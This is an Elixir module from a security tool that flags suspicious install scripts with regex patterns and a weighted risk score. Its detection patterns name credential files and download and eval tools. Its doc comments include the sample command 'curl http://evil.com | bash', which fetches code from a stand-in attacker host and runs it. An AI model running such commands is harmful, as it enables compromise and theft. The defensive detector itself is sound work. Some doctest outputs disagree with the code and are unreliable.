defmodule TamanduaServer.Detection.InstallScriptAnalyzer do
  @moduledoc """
  Analyzes install scripts and command lines for suspicious patterns.

  Detects common malicious patterns in pre/post install scripts:
  - Base64 encoding/obfuscation
  - Network downloads
  - Environment variable access
  - Dynamic code execution
  - Sensitive file access
  - Persistence mechanisms

  Returns risk scores using complement product formula for pattern weighting.
  """

  defp suspicious_patterns do
    [
    # Base64 / obfuscation (weight: 0.8-0.9)
    {~r/FromBase64String|base64\s+-d|atob\(/i, :base64_decode, 0.8},
    {~r/\-enc(?:oded)?(?:command)?\b/i, :encoded_command, 0.9},

    # Network operations (weight: 0.5-0.8)
    {~r/Invoke-WebRequest|curl\s|wget\s/i, :network_download, 0.7},
    {~r/DownloadString|DownloadFile|WebClient/i, :dotnet_download, 0.8},
    {~r/https?:\/\/[^\s'"]+/i, :url_reference, 0.5},

    # Environment access (weight: 0.4-0.5)
    {~r/process\.env\.|getenv\(|ENV\[/i, :env_access, 0.4},
    {~r/\$env:|System\.Environment/i, :env_access_ps, 0.5},

    # Code execution (weight: 0.6-0.9)
    {~r/\beval\s*\(|\bexec\s*\(/i, :code_execution, 0.9},
    {~r/Function\s*\(|new\s+Function/i, :dynamic_function, 0.85},
    {~r/child_process|spawn\s*\(|fork\s*\(/i, :process_spawn, 0.6},

    # File system operations (weight: 0.6-0.95)
    {~r/writeFileSync|fs\.write|fopen.*w/i, :file_write, 0.6},
    {~r/\.ssh\/|id_rsa|id_ed25519|id_dsa|\.aws\/credentials/i, :sensitive_file_access, 0.95},

    # Obfuscation indicators (weight: 0.5-0.7)
    {~r/\\x[0-9a-f]{2}|\\u[0-9a-f]{4}/i, :hex_escape, 0.5},
    {~r/String\.fromCharCode|chr\(\d+\)/i, :char_encoding, 0.7},

    # Persistence (weight: 0.85)
    {~r/crontab|schtasks|HKEY.*Run/i, :persistence_mechanism, 0.85}
    ]
  end

  @doc """
  Analyze a single command line for suspicious patterns.

  ## Parameters
    - command_line: String containing the command line to analyze

  ## Returns
    - :ok if no suspicious patterns found
    - {:suspicious, %{patterns: [...], risk_score: float, details: [...]}} if patterns detected

  ## Examples

      iex> InstallScriptAnalyzer.analyze_script("npm install lodash")
      :ok

      iex> InstallScriptAnalyzer.analyze_script("curl http://evil.com | bash")
      {:suspicious, %{patterns: [:network_download], risk_score: 0.7, details: [...]}}
  """
  def analyze_script(command_line) when is_binary(command_line) do
    patterns = extract_suspicious_patterns(command_line)

    if Enum.empty?(patterns) do
      :ok
    else
      risk_score = calculate_risk_score(patterns)
      {:suspicious, %{
        patterns: Enum.map(patterns, &elem(&1, 0)),
        risk_score: risk_score,
        details: patterns
      }}
    end
  end

  @doc """
  Extract all suspicious patterns matched in the content.

  ## Parameters
    - content: String to analyze

  ## Returns
    List of {pattern_name, weight} tuples for all matched patterns

  ## Examples

      iex> InstallScriptAnalyzer.extract_suspicious_patterns("curl http://evil.com")
      [{:network_download, 0.7}, {:url_reference, 0.5}]
  """
  def extract_suspicious_patterns(content) when is_binary(content) do
    suspicious_patterns()
    |> Enum.filter(fn {regex, _name, _weight} ->
      Regex.match?(regex, content)
    end)
    |> Enum.map(fn {_regex, name, weight} -> {name, weight} end)
  end
  def extract_suspicious_patterns(_), do: []

  @doc """
  Calculate risk score using complement product formula.

  Formula: 1 - product of (1 - weight) for all patterns
  This ensures multiple patterns increase the overall risk score.

  ## Parameters
    - patterns: List of {pattern_name, weight} tuples

  ## Returns
    Float between 0.0 and 1.0, rounded to 3 decimal places

  ## Examples

      iex> InstallScriptAnalyzer.calculate_risk_score([{:base64_decode, 0.8}])
      0.8

      iex> InstallScriptAnalyzer.calculate_risk_score([{:network_download, 0.7}, {:url_reference, 0.5}])
      0.85
  """
  def calculate_risk_score([]), do: 0.0
  def calculate_risk_score(patterns) when is_list(patterns) do
    patterns
    |> Enum.map(fn {_name, weight} -> 1 - weight end)
    |> Enum.reduce(1.0, &(&1 * &2))
    |> then(&(1 - &1))
    |> Float.round(3)
  end

  @doc """
  Analyze multiple command lines and combine results.

  ## Parameters
    - command_lines: List of command line strings

  ## Returns
    - :ok if all scripts are benign
    - {:suspicious, %{patterns: [...], risk_score: float, count: int}} if any are suspicious

  ## Examples

      iex> InstallScriptAnalyzer.analyze_scripts(["npm install", "echo hello"])
      :ok

      iex> InstallScriptAnalyzer.analyze_scripts(["curl http://evil.com", "base64 -d"])
      {:suspicious, %{patterns: [:network_download, :base64_decode], risk_score: 0.85, count: 2}}
  """
  def analyze_scripts(command_lines) when is_list(command_lines) do
    results = Enum.map(command_lines, &analyze_script/1)
    suspicious = Enum.filter(results, &match?({:suspicious, _}, &1))

    if Enum.empty?(suspicious) do
      :ok
    else
      combined_patterns = suspicious
      |> Enum.flat_map(fn {:suspicious, %{patterns: p}} -> p end)
      |> Enum.uniq()

      max_score = suspicious
      |> Enum.map(fn {:suspicious, %{risk_score: s}} -> s end)
      |> Enum.max()

      {:suspicious, %{
        patterns: combined_patterns,
        risk_score: max_score,
        count: length(suspicious)
      }}
    end
  end
  def analyze_scripts(_), do: :ok
end
